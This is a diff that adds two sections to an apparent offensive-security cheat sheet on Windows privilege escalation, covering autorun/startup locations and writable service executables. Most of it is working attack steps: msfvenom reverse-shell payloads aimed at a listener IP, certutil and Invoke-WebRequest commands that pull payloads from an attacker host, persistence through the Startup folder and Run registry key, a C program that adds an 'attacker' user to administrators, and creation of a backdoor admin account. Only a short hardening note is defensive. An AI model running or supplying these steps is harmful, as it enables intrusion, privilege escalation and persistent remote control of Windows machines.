@@ -1371,3 +1371,259 @@ Elevate via PsExec	psexec -u <user> -p <password> cmd.exe
 Schedule task w/ creds	schtasks /create ... /ru <user>
 
    </details>
+
+   <details>
+<summary>Autorun / Startup Applications</summary>
+ <br>
+  Windows allows programs to be configured to automatically execute at boot or login via various autorun or startup locations. If any of these locations have insecure file or directory permissions, a low-privileged user may be able to replace or modify a program, resulting in privilege escalation.
+
+This technique becomes powerful when:
+
+The autorun entry points to a program in a folder where users have write access
+
+The program runs as SYSTEM or Administrator
+
+The file is replaced by a malicious payload
+
+🔎 Detection Techniques
+✅ Autorun Registry & Startup Paths
+Registry keys to check:
+
+    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+✅ Startup Folder (per-user and global)
+Global (all users):
+
+      C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+
+Per-user:
+
+     C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+Use icacls to check permissions:
+
+powershell
+
+    icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+Check if "Users" or "Everyone" has (F) or (M) permissions (Full/Modify = vulnerable).
+<img width="734" height="304" alt="image" src="https://github.com/user-attachments/assets/bdd1860f-5427-4c79-9a6c-9a06b7d3ea64" />
+
+🔍 Using WinPEAS and Sysinternals Tools
+WinPEAS shows:
+
+Insecure file permissions
+Autorun entries
+Potential DLL hijacking targets
+Autoruns64.exe (Sysinternals):
+<img width="667" height="226" alt="image" src="https://github.com/user-attachments/assets/0cebe5ff-f10b-4d82-8458-c2ac27de5b42" />
+
+Go to the Logon tab
+
+Identify suspicious entries (e.g., My Program)
+
+Right-click → Check file location and permissions
+
+accesschk64.exe:
+
+cmd
+
+    accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe"
+Look for:
+<img width="400" height="134" alt="image" src="https://github.com/user-attachments/assets/9509b23b-1e66-4efa-a446-21b0086b4c58" />
+
+Everyone: FILE_ALL_ACCESS
+💣 Exploitation Techniques
+✅ Basic Reverse Shell Payload Creation
+Generate a payload using msfvenom:
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.42.239 LPORT=4444 -f exe -o reverse.exe
+Alternate (PowerShell):
+
+    msfvenom -p windows/powershell_reverse_tcp LHOST=10.6.42.239 LPORT=4444 -f psh > shell.ps1
+Start a Python server:
+
+    python3 -m http.server 8999
+Download payload on victim:
+
+powershell
+
+    certutil -urlcache -split -f http://10.6.42.239:8999/reverse.exe reverse.exe
+Or:
+
+powershell
+
+    Invoke-WebRequest "http://10.6.42.239:8999/reverse.exe" -OutFile "reverse.exe"
+✅ Replace Insecure Program
+powershell
+
+    Copy-Item "C:\Temp\reverse.exe" "C:\Program Files\Autorun Program\program.exe" -Force
+✅ Place in Startup Folder (If Writeable):
+powershell
+
+    Copy-Item -Path "C:\Temp\reverse.exe" -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\startshell.exe"
+✅ Persistence via Registry (Optional)
+powershell
+
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShellAccess" -Value "C:\Users\<user>\Documents\reverse.exe" -PropertyType String
+🧪 Simulate a Session
+Log off and back in
+
+Reboot the system
+
+OR trigger any action that invokes the autorun/startup program
+
+Your reverse shell listener should catch a shell as SYSTEM or Administrator.
+<img width="581" height="229" alt="image" src="https://github.com/user-attachments/assets/f7eb185f-2167-446a-a243-34d745c02c44" />
+
+🔁 Alternative Exploitation Methods
+📌 DLL Hijacking
+If an autorun app loads DLLs from the same folder and the folder is writable, you can plant a malicious DLL named as expected.
+
+Tools like Process Monitor or Procmon can help identify DLL load attempts.
+
+📌 Replace Scheduled Task Executable
+Scheduled tasks that point to insecure executables or paths can be exploited similarly. Check:
+
+powershell
+
+    schtasks /query /fo LIST /v
+Then:
+
+powershell
+
+    accesschk64.exe -wvu "C:\Path\To\Executable.exe"
+📌 PowerShell-Based Payload in Startup Folder
+Instead of EXE, drop a .ps1 file and create a .bat or .vbs launcher.
+
+Startup Folder Method:
+
+    @echo off
+    powershell -exec bypass -File "C:\ProgramData\Startup\shell.ps1"
+🧠 Summary
+Step	Tool/Command
+Detect startup items	Autoruns64.exe, WinPEAS, Registry, Startup folder
+Check permissions	accesschk64.exe, icacls
+Generate payload	msfvenom, revshells.com
+Transfer payload	certutil, Invoke-WebRequest, Python HTTP server
+Replace vulnerable EXE	Copy-Item, copy
+Trigger execution	Login/reboot or startup folder launch  
+ </details>
+ 
+  <details>
+<summary>Executable Files</summary>
+ <br>
+   This privilege escalation technique involves modifying an executable file used by a Windows Service when:
+
+The file is owned or writable by low-privileged users.
+
+The service runs with elevated privileges (e.g., SYSTEM or Administrator).
+
+The service loads the executable directly from disk without verification.
+
+If a user can overwrite or replace the service binary, they can inject a malicious executable that runs with SYSTEM privileges when the service is restarted.
+
+🔍 Detection
+✅ Using Accesschk (SysInternals)
+Transfer accesschk64.exe to the target Windows machine:
+
+    certutil -urlcache -split -f http://<attacker-ip>:<port>/accesschk64.exe accesschk64.exe
+
+<img width="769" height="230" alt="image" src="https://github.com/user-attachments/assets/d83105b5-e09f-4ac7-9260-d717959584ed" />
+Check for weak permissions on service binaries:
+
+    accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+Look for output like:
+<img width="748" height="256" alt="image" src="https://github.com/user-attachments/assets/c861dc30-0d3b-4611-88a4-e532ccc08e21" />
+
+Everyone FILE_ALL_ACCESS
+That indicates any user can overwrite the service binary — a major misconfiguration.
+
+✅ Using winPEAS
+Run winPEAS.exe on the target system. Look under the section:
+
+"Interesting file & directory permissions"
+
+You’ll see world-writable executables linked to services — these are prime targets.
+
+✅ Manual Check (Optional)
+Check permissions via GUI:
+
+Right-click the .exe file
+
+Go to Properties → Security → Advanced
+
+See if Users, Everyone, or a non-admin user has Write or Full Control
+
+⚔️ Exploitation
+Once you've identified a service binary you can overwrite, follow these steps:
+
+💣 Step 1: Write a Malicious Executable
+On Kali Linux:
+
+Edit a malicious C payload that performs privilege escalation (e.g., add user to admins):
+
+c
+
+#include <stdlib.h>
+int main() {
+  system("cmd.exe /c net localgroup administrators attacker /add");
+  return 0;
+}
+Compile it:
+
+    x86_64-w64-mingw32-gcc windows_service.c -o evil.exe
+💾 Step 2: Replace the Target Binary
+Upload evil.exe to the target machine:
+
+# On victim (PowerShell or CMD)
+copy C:\Temp\evil.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+(Use /Y to overwrite without prompt)
+
+🚀 Step 3: Start the Service
+
+    sc start filepermsvc
+The service will launch your malicious payload with elevated privileges.
+
+✅ Step 4: Verify Exploitation
+Check that the new user is added:
+
+    net localgroup administrators
+🧰 Alternative Methods
+🛠 Replace with Reverse Shell
+Instead of adding a user, you can embed a reverse shell payload using msfvenom:
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o revshell.exe
+Then overwrite the service binary with revshell.exe and restart the service.
+
+Start listener on Kali:
+
+    nc -lvnp 4444
+🧪 Persistence (Optional)
+After escalating, create a new user and add to administrators for long-term access:
+
+powershell
+
+    net user pwned P@ssw0rd! /add
+    net localgroup administrators pwned /add
+🧱 Hardening Recommendations
+If you're auditing a system:
+
+Ensure only SYSTEM or Administrator has write access to service executables.
+
+Use tools like AccessEnum or icacls to review ACLs.
+
+Avoid running services from user-writable locations like C:\Temp\ or Downloads.
+
+📌 Summary
+Step	Action
+1.	Identify vulnerable service binary with world-writable permissions
+2.	Overwrite it with a malicious executable
+3.	Restart the service
+4.	Get SYSTEM shell or escalate privilege
+ </details>
